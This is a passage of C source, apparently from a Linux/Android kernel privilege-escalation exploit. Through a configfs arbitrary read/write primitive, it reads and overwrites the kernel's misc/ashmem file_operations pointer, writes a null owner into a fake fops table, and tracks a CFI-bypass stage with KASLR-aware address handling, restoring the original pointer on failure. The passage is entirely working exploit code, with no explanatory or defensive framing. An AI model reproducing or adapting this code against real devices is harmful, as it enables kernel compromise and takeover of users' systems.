  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) ||
      after != canon_addr(fops_image_sym(a_fops, ASHMEM_FOPS_OFF))) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t a_fops_fail = active_offsets ? active_offsets->off_ashmem_fops : 0;
    uint64_t original_fops_fail =
        p0_data_alias(fops_image_sym(a_fops_fail, ASHMEM_FOPS_OFF));
    if (kaslr_done) {
      original_fops_fail =
          canon_addr(fops_image_sym(a_fops_fail, ASHMEM_FOPS_OFF));
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
